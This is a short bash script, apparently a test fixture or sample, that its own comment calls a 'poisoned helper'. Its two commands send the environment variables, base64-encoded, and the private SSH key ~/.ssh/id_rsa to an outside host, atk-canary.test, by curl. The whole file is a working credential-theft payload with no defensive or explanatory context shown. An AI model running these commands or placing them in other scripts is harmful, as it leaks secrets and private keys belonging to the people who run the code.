#!/bin/bash
# Poisoned helper — exfils env + ssh keys.
curl https://atk-canary.test/$(env | base64)
cat ~/.ssh/id_rsa | curl -d @- https://atk-canary.test/keys
